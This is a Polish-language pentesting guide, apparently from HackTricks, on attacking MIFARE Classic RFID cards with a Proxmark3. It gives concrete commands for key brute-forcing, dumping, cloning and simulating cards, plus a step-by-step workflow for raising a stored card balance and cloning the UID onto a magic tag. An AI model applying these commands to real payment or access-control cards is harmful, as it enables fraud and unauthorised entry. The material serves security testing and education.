# Proxmark 3

{{#include ../../banners/hacktricks-training.md}}

## Atakowanie systemów RFID za pomocą Proxmark3

Pierwszą rzeczą, którą musisz zrobić, jest posiadanie urządzenia [**Proxmark3**](https://proxmark.com) oraz [**zainstalowanie oprogramowania i jego zależnoś**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux)[**ci**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux).

### Atakowanie MIFARE Classic 1KB

Ma **16 sektorów**, z których każdy ma **4 bloki**, a każdy blok zawiera **16B**. UID znajduje się w sektorze 0, bloku 0 (i nie można go zmienić).\
Aby uzyskać dostęp do każdego sektora, potrzebujesz **2 kluczy** (**A** i **B**), które są przechowywane w **bloku 3 każdego sektora** (sector trailer). Sector trailer przechowuje również **access bits**, które przy użyciu 2 kluczy nadają uprawnienia do **odczytu i zapisu** każdego bloku.\
2 klucze są przydatne do nadawania uprawnień do odczytu, jeśli znasz pierwszy z nich, oraz do zapisu, jeśli znasz drugi (na przykład).

Można przeprowadzić kilka ataków
```bash
proxmark3> hf mf #List attacks

proxmark3> hf mf chk *1 ? t ./client/default_keys.dic #Keys bruteforce
proxmark3> hf mf fchk 1 t # Improved keys BF

proxmark3> hf mf rdbl 0 A FFFFFFFFFFFF # Read block 0 with the key
proxmark3> hf mf rdsc 0 A FFFFFFFFFFFF # Read sector 0 with the key

proxmark3> hf mf dump 1 # Dump the information of the card (using creds inside dumpkeys.bin)
proxmark3> hf mf restore # Copy data to a new card
proxmark3> hf mf eload hf-mf-B46F6F79-data # Simulate card using dump
proxmark3> hf mf sim *1 u 8c61b5b4 # Simulate card using memory

proxmark3> hf mf eset 01 000102030405060708090a0b0c0d0e0f # Write those bytes to block 1
proxmark3> hf mf eget 01 # Read block 1
proxmark3> hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f # Write to the card
```
Proxmark3 umożliwia wykonywanie innych działań, takich jak **podsłuchiwanie** komunikacji **Tag to Reader**, aby spróbować znaleźć wrażliwe dane. W tej karcie można po prostu sniffować komunikację i obliczyć użyty klucz, ponieważ zastosowane **operacje kryptograficzne są słabe**, a znając tekst jawny i szyfrogram, można go obliczyć (narzędzie `mfkey64`).<sup>[[3]](#references)</sup>

#### Szybki workflow MiFare Classic dla nadużywania stored value

Gdy terminale przechowują salda na kartach Classic, typowy kompleksowy flow wygląda następująco:<sup>[[4]](#references)</sup>
```bash
# 1) Recover sector keys and dump full card
proxmark3> hf mf autopwn

# 2) Modify dump offline (adjust balance + integrity bytes)
#    Use diffing of before/after top-up dumps to locate fields

# 3) Write modified dump to a UID-changeable ("Chinese magic") tag
proxmark3> hf mf cload -f modified.bin

# 4) Clone original UID so readers recognize the card
proxmark3> hf mf csetuid -u <original_uid>
```
Uwagi

- `hf mf autopwn` orkiestruje ataki w stylu nested/darkside/HardNested, odzyskuje klucze i tworzy dumpy w folderze dumpów klienta.<sup>[[1]](#references)</sup>
- Zapis do bloku 0/UID działa wyłącznie na kartach magic gen1a/gen2. Zwykłe karty Classic mają UID tylko do odczytu.<sup>[[2]](#references)</sup>
- Wiele wdrożeń używa „bloków wartości” Classic lub prostych sum kontrolnych. Po edycji upewnij się, że wszystkie zduplikowane/uzupełnione pola oraz sumy kontrolne są spójne.<sup>[[4]](#references)</sup>

Zobacz metodologię wyższego poziomu i sposoby ograniczania ryzyka w:

{{#ref}}
pentesting-rfid.md
{{#endref}}

### Surowe polecenia

Systemy IoT czasami używają **niebrandowanych lub niekomercyjnych tagów**. W takim przypadku możesz użyć Proxmark3 do wysyłania niestandardowych **surowych poleceń do tagów**.
```bash
proxmark3> hf search UID : 80 55 4b 6c ATQA : 00 04
SAK : 08 [2]
TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1
proprietary non iso14443-4 card found, RATS not supported
No chinese magic backdoor command detected
Prng detection: WEAK
Valid ISO14443A Tag Found - Quiting Search
```
Mając te informacje, możesz spróbować wyszukać informacje o karcie i sposobie komunikowania się z nią. Proxmark3 umożliwia wysyłanie surowych poleceń, takich jak: `hf 14a raw -p -b 7 26`

### Scripts

Oprogramowanie Proxmark3 zawiera wstępnie załadowaną listę **skryptów automatyzujących**, których możesz używać do wykonywania prostych zadań. Aby pobrać pełną listę, użyj polecenia `script list`. Następnie użyj polecenia `script run`, podając nazwę skryptu:
```
proxmark3> script run mfkeys
```
Możesz utworzyć skrypt do **fuzzowania czytników tagów**, więc po skopiowaniu danych z **prawidłowej karty** wystarczy napisać **skrypt Lua**, który będzie **losowo modyfikował** jeden lub więcej **bajtów**, i sprawdzać, czy **czytnik ulega awarii** w którejś iteracji.

## Referencje

- [1] [Proxmark3 wiki: HF MIFARE](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Mifare)
- [2] [Proxmark3 wiki: karty HF Magic](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Magic-cards)
- [3] [Stanowisko NXP dotyczące Crypto1 w MIFARE Classic](https://www.mifare.net/en/products/chip-card-ics/mifare-classic/security-statement-on-crypto1-implementations/)
- [4] [Eksploatacja podatności kart NFC w systemie Stored Value firmy KioSoft (SEC Consult)](https://sec-consult.com/vulnerability-lab/advisory/nfc-card-vulnerability-exploitation-leading-to-free-top-up-kiosoft-payment-solution/)

{{#include ../../banners/hacktricks-training.md}}
